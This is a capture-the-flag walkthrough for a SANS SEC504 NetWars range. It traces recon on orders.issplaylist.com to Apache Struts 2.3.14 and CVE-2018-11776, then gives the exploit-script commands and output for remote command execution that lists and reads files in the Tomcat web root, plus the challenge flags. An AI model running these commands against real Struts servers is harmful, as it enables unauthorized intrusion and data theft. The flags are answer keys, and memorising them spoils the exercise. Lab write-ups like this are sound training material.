# SEC504 Ranges.io CTF - Walkthrough

This document contains my step-by-step solutions for the **orders.issplaylist.com** section challenges.  
Each section includes **question**, **steps taken**, and **answer/flag**.

---

## Search Engine Restriction
**Question:**  
Retrieve the search engine restriction resource on the web server orders.issplaylist.com. Enter the flag.

**Steps Taken:**
1. The phrase *search engine restriction* suggested looking for a `robots.txt` file.
2. Navigated to:  
   ```
   https://orders.issplaylist.com/robots.txt
   ```
3. Retrieved the flag from the file.

**Flag:**  
`NetWars{ValuableReconData}`


## Apache Struts Version
**Question:**  
Using the information on the orders.issplaylist.com website, identify the version of Apache Struts in use.

**Steps Taken:**
1. Viewed `robots.txt` file.
2. Noted the line:  
   ```
   Disallow: struts2-showcase-2.3.14
   ```

**Answer:**  
`2.3.14`


## Vulnerability Research
**Question:**  
Research the version of Apache Struts using in-game assets. Which CVE entry describes a known vulnerability for this version of Apache Struts?

**Steps Taken:**
1. Used **ClippedBin** OSINT resource to search for `struts`.
2. Located an exploit post containing the CVE reference.

**Answer:**  
`CVE-2018-11776`


## Exploit Identification
**Question:**  
Using in-game assets, identify an exploit left behind by the attackers. Enter the name of the exploit code author (first and last).

**Steps Taken:**
1. Located the exploit code via ClippedBin.
2. Found the author’s name in the comments.

**Answer:**  
`Mazin Ahmed`


## Vulnerability Exploitation
**Question:**  
Use the exploit to gain access to the orders.issplaylist.com server. Retrieve the flag in the `/opt/tomcat/webapps/ROOT` directory.

**Steps Taken:**
1. Saved exploit as `struts-exploit.py` and made it executable:
   ```bash
   chmod 755 struts-exploit.py
   ```
2. Verified script usage:
   ```bash
   ./struts-exploit.py -h
   ```
3. Initial attempt on base URL failed (not vulnerable).
4. Identified `.action` endpoint:  
   ```
   https://orders.issplaylist.com/showcase/help.action
   ```
5. Executed exploit:
   ```bash
   ./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c id --exploit
   ```
   **Output:**
   ```
   uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
   ```
6. Listed directories:
   ```bash
   ./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c 'ls -l /opt/tomcat/webapps/ROOT/' --exploit
   ```
   Found `Flag.txt` file.
7. Retrieved flag:
   ```bash
   ./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c 'cat /opt/tomcat/webapps/ROOT/Flag.txt' --exploit
   ```
   **Output:**
   ```
   NetWars{SuccessfulExploit}
   ```

**Flag:**  
`NetWars{SuccessfulExploit}`


## Web Password File
**Question:**  
Using the same exploit access, examine the file used for storing encrypted passwords in the web root (`/opt/tomcat/webapps/ROOT/`). Submit the flag.

**Steps Taken:**  
*(to be continued with further exploitation steps — enumerate files in `/opt/tomcat/webapps/ROOT/`, identify the password storage file, and extract its contents).*

